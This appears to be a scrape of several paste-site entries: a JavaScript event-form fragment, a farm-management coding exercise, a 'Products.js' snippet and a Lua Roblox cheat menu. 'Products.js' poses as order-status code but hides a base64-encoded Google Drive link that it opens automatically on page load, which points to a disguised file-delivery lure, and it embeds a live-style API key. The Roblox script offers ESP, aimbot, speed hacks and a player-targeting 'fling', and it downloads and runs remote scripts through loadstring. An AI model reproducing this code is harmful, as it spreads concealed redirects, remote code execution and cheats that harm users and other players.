		let paraTitle = document.createElement('strong');
		paraTitle.textContent = 'Event:';
		let eventBreak = document.createElement('br');
		eventPara.appendChild(paraTitle);
		eventPara.appendChild(eventBreak);
		eventPara.append(eventField.value);
		eventArticle.appendChild(eventPara);

		let locationPara = document.createElement('p');
		let paraTitleLoc = document.createElement('strong');
		paraTitleLoc.textContent = 'Location:';
		let eventBreakLoc = document.createElement('br');
		locationPara.appendChild(paraTitleLoc);
		locationPara.appendChild(eventBreakLoc);
		locationPara.append(locationField.value);
		eventArticle.appendChild(locationPara);

		eventItem.appendChild(eventArticle);

		let editBtn = document.createElement('button');
		editBtn.classList.add('action-btn');
		editBtn.classList.add('edit');
		editBtn.textContent = 'edit';
		editBtn.addEventListener('click', editEvent);
		eventItem.appendChild(editBtn);

		let applyBtn = document.createElement('button');
		applyBtn.classList.add('action-btn');
		applyBtn.classList.add('apply');
		applyBtn.textContent = 'apply';
		applyBtn.addEventListener('click', applyEvent);
		eventItem.appendChild(applyBtn);

		previewList.appendChild(eventItem);

		nextBtn.disabled = true;
		emailField.value = '';
		eventField.value = '';
		locationField.value = '';
	}

	function editEvent (event) {
		let editEventLi = event.currentTarget.parentElement;
		let editEmail = editEventLi.querySelector('article h4').textContent;
		let editEvent = editEventLi.querySelector('article p:first-of-type').textContent.split(':')[1];
		let editLocation = editEventLi.querySelector('article p:last-of-type').textContent.split(':')[1];

		emailField.value = editEmail;
		eventField.value = editEvent;
		locationField.value = editLocation;
		nextBtn.disabled = false;
		
		previewList.removeChild(editEventLi);
	}

	function applyEvent (event) {
		let applyEventLi = event.currentTarget.parentElement;
		let buttons = applyEventLi.querySelectorAll('button');

		for (let btn of buttons) {
			applyEventLi.removeChild(btn);
		}

		previewList.removeChild(applyEventLi);
		eventList.appendChild(applyEventLi);
	}
}"
v1w39TKW,01.Farm Management System,Kamend1,JavaScript,Monday 7th of April 2025 07:00:25 AM CDT,"function solve (commandArr) {
    class Farmer {
        constructor (name, location) {
            this.name = name;
            this.location = location;
            this.skills = []
        }
    }

    let farmerArr = [];
    let numFarmers = Number(commandArr[0]);

    for (let idx = 1; idx <= numFarmers; idx++) {
        let farmerStr = commandArr[idx];
        let [name, location, skills] = farmerStr.split(' ');
        let farmer = new Farmer(name, location);
        let skillArr = skills.split(',');

        for (let skill of skillArr) {
            farmer.skills.push(skill);
        }
        farmerArr.push(farmer);
    }

    for (let idx = numFarmers + 1; idx < commandArr.length; idx++) {
        currentCommandTokens = commandArr[idx].split(' / ');
        if (currentCommandTokens[0] === ""End"") {
            break;
        } else if (currentCommandTokens[0] === ""Execute"") {
            let [_, name, location, task] = currentCommandTokens;
            let currentFarmer = farmerArr.find(p => p.name === name);

            if (!currentFarmer) {
                continue;
            }

            if (currentFarmer.location !== location) {
                console.log(`${currentFarmer.name} cannot execute the task: ${task}.`);
                continue;
            }

            if (!currentFarmer.skills.includes(task)) {
                console.log(`${currentFarmer.name} cannot execute the task: ${task}.`);
                continue;
            }

            console.log(`${currentFarmer.name} has executed the task: ${task}!`)

        } else if (currentCommandTokens[0] === ""Change Area"") {
            let [_, name, location] = currentCommandTokens;
            let currentFarmer = farmerArr.find(p => p.name === name);
            
            if (!currentFarmer) {
                continue;
            }

            if (currentFarmer.location !== location) {
                currentFarmer.location = location;
                console.log(`${currentFarmer.name} has changed their work area to: ${location}`);
            }

        } else if (currentCommandTokens[0] === ""Learn Task"") {
            let [_, name, task] = currentCommandTokens;
            let currentFarmer = farmerArr.find(p => p.name === name);
            
            if (!currentFarmer) {
                continue;
            }

            if (currentFarmer.skills.includes(task)) {
                console.log(`${currentFarmer.name} already knows how to perform ${task}.`);
            } else {
                currentFarmer.skills.push(task);
                console.log(`${currentFarmer.name} has learned a new task: ${task}.`);
            }
        }
    }

    for (let farmer of farmerArr) {
        console.log(`Farmer: ${farmer.name}, Area: ${farmer.location}, Tasks: ${farmer.skills.sort().join(', ')}`);
    }

}"
e9vcK3L0,Products.js,Epiphemeral,JavaScript,Monday 7th of April 2025 06:58:39 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/01811/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Ja7iUABb,SkipperHub v3,jenitho,Lua,Monday 7th of April 2025 06:48:36 AM CDT,"--SkipperHub!!!

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = ""💫Skippers Mod Menu💫 | Free"",
   Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
   LoadingTitle = ""Free v3"",
   LoadingSubtitle = ""by Skipper"",
   Theme = ""Default"", -- Check https://docs.sirius.menu/rayfield/configuration/themes

   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface

   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil, -- Create a custom folder for your hub/game
      FileName = ""Big Hub""
   },

   Discord = {
      Enabled = false, -- Prompt the user to join your Discord server if their executor supports it
      Invite = ""noinvitelink"", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ ABCD would be ABCD
      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
   },

   KeySystem = true, -- Set this to true to use our key system
   KeySettings = {
      Title = ""Skipper Mod Menu | Free"",
      Subtitle = ""Key System"",
      Note = ""Key System even tho it´s Free | In Discord!"", -- Use this to tell the user how to get a key
      FileName = ""Key"", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
      SaveKey = false, -- The user's key will be saved, but if you change the key, they will be unable to use your script
      GrabKeyFromSite = true, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = {""GUI""} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings (""hello"",""key22"")
   }
})


Rayfield:Notify({
   Title = ""Thanks for using our Script!"",
   Content = ""have fun!"",
   Duration = 10,
   Image = 4483362458,
})

local ESPTab = Window:CreateTab(""🟥Esp Opptions🟥"", 4483362458) -- Title, Image
local ESPSection = ESPTab:CreateSection(""🟥ESP🟥"")


local AIMTab = Window:CreateTab(""🔫Aim Oppitions🔫"", 4483362458) -- Title, Image
local AIMSection = AIMTab:CreateSection(""🔫Aimbot"")


local STUFFTab = Window:CreateTab(""➕Other Stuff➕"", 4483362458) -- Title, Image
local STUFFSection = STUFFTab:CreateSection(""➕Stuff➕"")


local ScrTab = Window:CreateTab(""☁️Scripthubs Opptions☁️"", 4483362458) -- Title, Image
local ScrSection = ScrTab:CreateSection(""☁️Hubs☁️"")


local DISTab = Window:CreateTab(""✨Discord✨"", 4483362458) -- Title, Image
local DISSection = DISTab:CreateSection(""✨https://discord.gg/mDnAFVs8✨"")


    
local Button = ESPTab:CreateButton({
   Name = ""🔴Tracer (Everyone)🔴"",
   Callback = function()
   -- LocalScript in StarterPlayer > StarterPlayerScripts

local Players = game:GetService(""Players"")
local RunService = game:GetService(""RunService"")
local localPlayer = Players.LocalPlayer

-- Tracer-Einstellungen
local function createTracer()
	local tracer = Drawing.new(""Line"")
	tracer.Color = Color3.fromRGB(225,27,27)
	tracer.Thickness = 1.5
	tracer.Transparency = 1
	tracer.Visible = true
	return tracer
end

-- Spieler ESP hinzufügen (Highlight + Tracer)
local trackedPlayers = {}

local function addESP(targetPlayer)
	if targetPlayer == localPlayer then return end

	local function onCharacterAdded(character)
		-- Highlight hinzufügen
		local highlight = Instance.new(""Highlight"")
		highlight.FillColor = Color3.fromRGB(0, 255, 0)
		highlight.FillTransparency = 0.5
		highlight.OutlineTransparency = 1
		highlight.Adornee = character
		highlight.Parent = character

		-- Tracer erstellen
		local tracer = createTracer()
		trackedPlayers[targetPlayer] = {
			character = character,
			tracer = tracer
		}
	end

	if targetPlayer.Character then
		onCharacterAdded(targetPlayer.Character)
	end

	targetPlayer.CharacterAdded:Connect(onCharacterAdded)
end

-- Alle bestehenden Spieler tracken
for _, player in pairs(Players:GetPlayers()) do
	addESP(player)
end

-- Neue Spieler tracken
Players.PlayerAdded:Connect(function(player)
	addESP(player)
end)

-- Update Tracers jedes Frame
RunService.RenderStepped:Connect(function()
	for player, data in pairs(trackedPlayers) do
		local character = data.character
		local tracer = data.tracer

		if character and character:FindFirstChild(""HumanoidRootPart"") then
			local hrp = character.HumanoidRootPart
			local screenPos, onScreen = workspace.CurrentCamera:WorldToViewportPoint(hrp.Position)
			if onScreen then
				local bottomOfScreen = Vector2.new(workspace.CurrentCamera.ViewportSize.X / 2, workspace.CurrentCamera.ViewportSize.Y)
				tracer.From = bottomOfScreen
				tracer.To = Vector2.new(screenPos.X, screenPos.Y)
				tracer.Visible = true
			else
				tracer.Visible = false
			end
		else
			tracer.Visible = false
		end
	end
end)
   end,
})


local Button = ScrTab:CreateButton({
   Name = ""☁️Infinity Yield☁️"",
   Callback = function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
   end,
})


local Button = ScrTab:CreateButton({
   Name = ""☁️Solara Hub v3☁️"",
   Callback = function()
   loadstring(game:HttpGet(""https://raw.githubusercontent.com/samuraa1/Solara-Hub/refs/heads/main/Solara%20Hub.lua""))()
   end,
})


local Button = ScrTab:CreateButton({
   Name = ""☁️Chat Troller☁️ (Patched)"",
   Callback = function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/ffedex/characters/refs/heads/main/chars', true))()
   end,
})


local Button = STUFFTab:CreateButton({
   Name = ""✖️Walkspeed✖️"",
   Callback = function()
    local Player = game.Players.LocalPlayer
local UIS = game:GetService(""UserInputService"")
local TweenService = game:GetService(""TweenService"")
local CharacterAdded = Player.CharacterAdded
 
local function createUI()
    local Character = Player.Character or Player.CharacterAdded:Wait()
    local Humanoid = Character:WaitForChild(""Humanoid"")
    
    -- Create the GUI elements
    local ScreenGui = Instance.new(""ScreenGui"")
    ScreenGui.Parent = Player:WaitForChild(""PlayerGui"")
    ScreenGui.Name = ""WalkSpeedGUI""
 
    -- Create the frame for the slider
    local Frame = Instance.new(""Frame"")
    Frame.Size = UDim2.new(0, 420, 0, 120)
    Frame.Position = UDim2.new(0.5, -210, 0.8, -60)
    Frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    Frame.BackgroundTransparency = 0.5
    Frame.BorderSizePixel = 0
    Frame.Parent = ScreenGui
    -- Add rounded corners to the frame
    local UICorner = Instance.new(""UICorner"")
    UICorner.CornerRadius = UDim.new(0, 16)
    UICorner.Parent = Frame
 
    -- Create the title text
    local Title = Instance.new(""TextLabel"")
    Title.Size = UDim2.new(1, 0, 0, 30)
    Title.Text = ""WalkSpeed Slider""
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.TextSize = 22
    Title.Font = Enum.Font.GothamBold
    Title.TextStrokeTransparency = 0.8
    Title.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    Title.BackgroundTransparency = 1
    Title.Parent = Frame
 
    -- Create the slider container
    local Slider = Instance.new(""Frame"")
    Slider.Size = UDim2.new(1, -40, 0, 10)
    Slider.Position = UDim2.new(0, 20, 0, 50)
    Slider.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
    Slider.BorderSizePixel = 0
    Slider.Parent = Frame
    -- Add rounded corners to the slider container
    local SliderCorner = Instance.new(""UICorner"")
    SliderCorner.CornerRadius = UDim.new(0, 5)
    SliderCorner.Parent = Slider
 
    -- Create the slider button
    local SliderButton = Instance.new(""Frame"")
    SliderButton.Size = UDim2.new(0, 20, 1, 0)
    SliderButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    SliderButton.BorderSizePixel = 0
    SliderButton.Parent = Slider
    -- Add rounded corners to the slider button
    local SliderButtonCorner = Instance.new(""UICorner"")
    SliderButtonCorner.CornerRadius = UDim.new(0, 10)
    SliderButtonCorner.Parent = SliderButton
 
    -- Create gradient effect for the slider button
    local Gradient = Instance.new(""UIGradient"")
    Gradient.Rotation = 45
    Gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 0)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 200, 0))
    })
    Gradient.Parent = SliderButton
 
    -- Function to update walkspeed based on slider position
    local function updateWalkSpeed()
        -- Get the X position of the slider button
        local sliderPosition = SliderButton.Position.X.Offset / Slider.AbsoluteSize.X
        -- Debugging: Print the slider position and walk speed
        print(""Slider Position:"", sliderPosition)
        -- Ensure the walk speed is within a reasonable range, clamp it between 16 and 500
        Humanoid.WalkSpeed = math.clamp(sliderPosition * 500, 16, 500)
        print(""Updated WalkSpeed:"", Humanoid.WalkSpeed)
    end
 
    -- Dragging logic
    local dragging = false
    local mouse = Player:GetMouse()
 
    SliderButton.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
        end
    end)
 
    SliderButton.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
        end
    end)
 
    UIS.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            -- Calculate the new position of the slider button based on the mouse's X position
            local sliderWidth = Slider.AbsoluteSize.X
            local newX = math.clamp(mouse.X - Slider.AbsolutePosition.X, 0, sliderWidth)
            -- Set the slider button position with a smooth tween effect
            TweenService:Create(SliderButton, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(0, newX, 0, 0)}):Play()
            -- Update WalkSpeed continuously as the button is moved
            updateWalkSpeed()
        end
    end)
 
    -- Initial walk speed setup
    updateWalkSpeed()
end
 
-- Recreate UI every time the player respawns
CharacterAdded:Connect(function()
    -- Clean up any existing UI if it exists
    if Player:FindFirstChild(""PlayerGui"") and Player.PlayerGui:FindFirstChild(""WalkSpeedGUI"") then
        Player.PlayerGui:FindFirstChild(""WalkSpeedGUI""):Destroy()
    end
    -- Create a new UI after respawn
    createUI()
end)
 
-- Create the UI for the first time
createUI()
   
   end,
})

local Button = STUFFTab:CreateButton({
   Name = ""✖️Jump Power✖️"",
   Callback = function()
   local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild(""Humanoid"")
 
-- Ensure humanoid updates on respawn
player.CharacterAdded:Connect(function(newCharacter)
    character = newCharacter
    humanoid = newCharacter:WaitForChild(""Humanoid"")
end)
 
-- Create UI
local screenGui = Instance.new(""ScreenGui"")
screenGui.Parent = player:WaitForChild(""PlayerGui"")
 
local frame = Instance.new(""Frame"")
frame.Size = UDim2.new(0, 200, 0, 50)
frame.Position = UDim2.new(0.5, -100, 0.1, 0)
frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50) -- Dark grey
frame.BorderSizePixel = 0
frame.Active = true -- Needed for dragging
frame.Draggable = true -- Makes the frame draggable
frame.Parent = screenGui
 
-- Rounded Edges
local uiCorner = Instance.new(""UICorner"")
uiCorner.CornerRadius = UDim.new(0.2, 0)
uiCorner.Parent = frame
 
local label = Instance.new(""TextLabel"")
label.Text = ""Jump Power:""
label.Size = UDim2.new(0, 100, 1, 0)
label.Position = UDim2.new(0, 5, 0, 0)
label.BackgroundTransparency = 1
label.TextColor3 = Color3.new(1, 1, 1) -- White
label.TextScaled = true
label.Font = Enum.Font.SourceSans
label.Parent = frame
 
local textBox = Instance.new(""TextBox"")
textBox.Size = UDim2.new(0, 80, 0.8, 0)
textBox.Position = UDim2.new(1, -85, 0.1, 0)
textBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30) -- Slightly darker grey
textBox.TextColor3 = Color3.new(1, 1, 1)
textBox.Text = """" -- Starts empty
textBox.TextScaled = true
textBox.Font = Enum.Font.SourceSans
textBox.Parent = frame
 
local uiCorner2 = Instance.new(""UICorner"")
uiCorner2.CornerRadius = UDim.new(0.2, 0)
uiCorner2.Parent = textBox
 
-- Default Jump Power
local defaultJumpPower = humanoid.JumpPower
 
-- Update Jump Power
textBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        local newJumpPower = tonumber(textBox.Text)
        if newJumpPower and newJumpPower > 0 then
            humanoid.JumpPower = newJumpPower
        else
            textBox.Text = """"
            humanoid.JumpPower = defaultJumpPower -- Reset to default
        end
    end
end)
   end,
})


local Button = STUFFTab:CreateButton({
   Name = ""➕Fling➕"",
   Callback = function()
   local Players = game:GetService(""Players"")
local Player = Players.LocalPlayer
 
local ScreenGui = Instance.new(""ScreenGui"")
local Frame = Instance.new(""Frame"")
local TextBox = Instance.new(""TextBox"")
local TextButton = Instance.new(""TextButton"")
local CloseButton = Instance.new(""TextButton"") -- Close button
 
ScreenGui.Parent = Player:WaitForChild(""PlayerGui"")
ScreenGui.ResetOnSpawn = false
 
Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
Frame.Position = UDim2.new(0.5, -100, 0.5, -50)
Frame.Size = UDim2.new(0, 200, 0, 100)
Frame.Active = true
Frame.Draggable = true
 
TextBox.Parent = Frame
TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextBox.Position = UDim2.new(0.1, 0, 0.2, 0)
TextBox.Size = UDim2.new(0.8, 0, 0.2, 0)
TextBox.Font = Enum.Font.SourceSans
TextBox.PlaceholderText = ""Enter username""
TextBox.Text = """"
TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
TextBox.TextSize = 14
 
TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
TextButton.Position = UDim2.new(0.1, 0, 0.5, 0)
TextButton.Size = UDim2.new(0.8, 0, 0.4, 0)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = ""FLING!""
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextSize = 20
 
-- Close button properties
CloseButton.Parent = Frame
CloseButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
CloseButton.Position = UDim2.new(0.9, 0, 0, 0)
CloseButton.Size = UDim2.new(0, 20, 0, 20)
CloseButton.Font = Enum.Font.SourceSans
CloseButton.Text = ""X""
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.TextSize = 14
 
local function GetPlayer(Name)
    Name = Name:lower()
    for _, x in next, Players:GetPlayers() do
        if x ~= Player then
            if x.Name:lower():match(""^"" .. Name) or x.DisplayName:lower():match(""^"" .. Name) then
                return x
            end
        end
    end
    return nil
end
 
local function Message(_Title, _Text, Time)
    game:GetService(""StarterGui""):SetCore(""SendNotification"", {Title = _Title, Text = _Text, Duration = Time})
end
 
local function SkidFling(TargetPlayer)
    local Character = Player.Character
    local Humanoid = Character and Character:FindFirstChildOfClass(""Humanoid"")
    local RootPart = Humanoid and Humanoid.RootPart
 
    local TCharacter = TargetPlayer.Character
    local THumanoid = TCharacter and TCharacter:FindFirstChildOfClass(""Humanoid"")
    local TRootPart = THumanoid and THumanoid.RootPart
    local THead = TCharacter and TCharacter:FindFirstChild(""Head"")
    local Accessory = TCharacter and TCharacter:FindFirstChildOfClass(""Accessory"")
    local Handle = Accessory and Accessory:FindFirstChild(""Handle"")
 
    if Character and Humanoid and RootPart then
        if RootPart.Velocity.Magnitude < 50 then
            getgenv().OldPos = RootPart.CFrame
        end
        if THumanoid and THumanoid.Sit then
            return Message(""Error Occurred"", ""Target is sitting"", 5)
        end
        if THead then
            workspace.CurrentCamera.CameraSubject = THead
        elseif Handle then
            workspace.CurrentCamera.CameraSubject = Handle
        else
            workspace.CurrentCamera.CameraSubject = THumanoid
        end
        if not TCharacter:FindFirstChildWhichIsA(""BasePart"") then
            return
        end
 
        local function FPos(BasePart, Pos, Ang)
            RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
            Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
            RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
            RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
        end
 
        local function SFBasePart(BasePart)
            local TimeToWait = 2
            local Time = tick()
            local Angle = 0
 
            repeat
                if RootPart and THumanoid then
                    if BasePart.Velocity.Magnitude < 50 then
                        Angle = Angle + 100
 
                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
                    else
                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
                        task.wait()
 
                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()
                    end
                else
                    break
                end
            until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
        end
 
        workspace.FallenPartsDestroyHeight = 0/0
 
        local BV = Instance.new(""BodyVelocity"")
        BV.Name = ""EpixVel""
        BV.Parent = RootPart
        BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
        BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
 
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
 
        if TRootPart and THead then
            if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
                SFBasePart(THead)
            else
                SFBasePart(TRootPart)
            end
        elseif TRootPart and not THead then
            SFBasePart(TRootPart)
        elseif not TRootPart and THead then
            SFBasePart(THead)
        elseif not TRootPart and not THead and Accessory and Handle then
            SFBasePart(Handle)
        end
 
        BV:Destroy()
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
        workspace.CurrentCamera.CameraSubject = Humanoid
 
        repeat
            RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
            Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
            Humanoid:ChangeState(""GettingUp"")
            table.foreach(Character:GetChildren(), function(_, x)
                if x:IsA(""BasePart"") then
                    x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
                end
            end)
            task.wait()
        until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
        workspace.FallenPartsDestroyHeight = getgenv().FPDH
    else
        return Message(""Error Occurred"", ""Random error"", 5)
    end
end
 
TextButton.MouseButton1Click:Connect(function()
    local targetName = TextBox.Text
    local targetPlayer = GetPlayer(targetName)
 
    if targetPlayer then
        SkidFling(targetPlayer)
    else
        Message(""Error Occurred"", ""Invalid username"", 5)
    end
end)
 
-- Close button functionality
CloseButton.MouseButton1Click:Connect(function()
    ScreenGui.Enabled = false
end)
   end,
})

local Toggle = STUFFTab:CreateButton({
    Name = ""✖️Bunny Sprint✖️"",
    Callback = function(Value)
        -- Movement settings
local STRAFE_SPEED = 30
local AIR_MULTIPLIER = 1.5
local BHOP_POWER = 40

-- Services
local Players = game:GetService(""Players"")
local UserInputService = game:GetService(""UserInputService"")
local RunService = game:GetService(""RunService"")

-- Local player setup
local player = Players.LocalPlayer
local mouse = player:GetMouse()

-- Variables
local moveKeys = {
    W = false,
    A = false,
    S = false,
    D = false,
    Space = false
}

-- Functions to handle character access safely
local function getChar()
    return player.Character or player.CharacterAdded:Wait()
end

local function getRoot()
    local char = getChar()
    return char:FindFirstChild(""HumanoidRootPart"")
end

local function getHumanoid()
    local char = getChar()
    return char:FindFirstChild(""Humanoid"")
end

-- Movement function
local function calculateMoveDirection()
    local dir = Vector3.new(0, 0, 0)
    local char = getChar()
    if not char then return dir end
    
    local cf = workspace.CurrentCamera.CFrame
    
    if moveKeys.W then
        dir = dir + cf.LookVector
    end
    if moveKeys.S then
        dir = dir - cf.LookVector
    end
    if moveKeys.A then
        dir = dir - cf.RightVector
    end
    if moveKeys.D then
        dir = dir + cf.RightVector
    end
    
    dir = Vector3.new(dir.X, 0, dir.Z).Unit
    return dir
end

-- Key handling
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    
    if input.KeyCode == Enum.KeyCode.W then
        moveKeys.W = true
    elseif input.KeyCode == Enum.KeyCode.A then
        moveKeys.A = true
    elseif input.KeyCode == Enum.KeyCode.S then
        moveKeys.S = true
    elseif input.KeyCode == Enum.KeyCode.D then
        moveKeys.D = true
    elseif input.KeyCode == Enum.KeyCode.Space then
        moveKeys.Space = true
    end
end)

UserInputService.InputEnded:Connect(function(input, gameProcessed)
    if input.KeyCode == Enum.KeyCode.W then
        moveKeys.W = false
    elseif input.KeyCode == Enum.KeyCode.A then
        moveKeys.A = false
    elseif input.KeyCode == Enum.KeyCode.S then
        moveKeys.S = false
    elseif input.KeyCode == Enum.KeyCode.D then
        moveKeys.D = false
    elseif input.KeyCode == Enum.KeyCode.Space then
        moveKeys.Space = false
    end
end)

-- Main movement loop
RunService.Heartbeat:Connect(function()
    local char = getChar()
    local root = getRoot()
    local humanoid = getHumanoid()
    
    if not char or not root or not humanoid then return end
    
    -- Calculate movement
    local moveDir = calculateMoveDirection()
    local isInAir = humanoid:GetState() == Enum.HumanoidStateType.Jumping or 
                    humanoid:GetState() == Enum.HumanoidStateType.Freefall
    
    -- Apply movement
    if moveDir.Magnitude > 0 then
        local speed = STRAFE_SPEED
        if isInAir then
            speed = speed * AIR_MULTIPLIER
        end
        
        -- Set velocity
        local newVel = moveDir * speed
        root.Velocity = Vector3.new(
            newVel.X,
            root.Velocity.Y,  -- Preserve vertical velocity
            newVel.Z
        )
        
        -- Bunny hop
        if moveKeys.Space and root.Velocity.Y < 1 then
            root.Velocity = Vector3.new(
                root.Velocity.X,
                BHOP_POWER,
                root.Velocity.Z
            )
        end
    end
end)

-- Notification
game:GetService(""StarterGui""):SetCore(""SendNotification"", {
    Title = ""Movement Script Loaded"",
    Text = ""Controls: WASD to move, Space to jump"",
    Duration = 5
})
    end,
})


local UserInputService = game:GetService(""UserInputService"")
local Players = game:GetService(""Players"")
local RunService = game:GetService(""RunService"")
local Camera = workspace.CurrentCamera
local LocalPlayer = Players.LocalPlayer

local LockedPlayer = nil
local LastKnownPosition = nil
local FieldOfView = 40 -- Set the field of view to 40 degrees
local CenterPrioritizationFactor = 0.5 -- Decrease this value to shrink the priority ""circle""
local AimbotEnabled = false -- Track whether the aimbot is enabled or not

-- Function to check if a player is on the enemy team
local function isEnemyTeam(player)
    -- If the local player has no team, or the target player has no team, return false
    if not LocalPlayer.Team or not player.Team then
        return false
    end
    
    -- Return true if the teams are different
    return LocalPlayer.Team ~= player.Team
end

-- Function to get the body part based on weighted probabilities
local function getTargetBodyPart()
    local randomValue = math.random()
    if randomValue <= 0.7 then
        return ""UpperTorso"" -- 70% chance
    else
        return ""Head"" -- 30% chance
    end
end

-- Function to get the closest enemy player to the crosshair, prioritizing players near the center of the screen and closest to the player
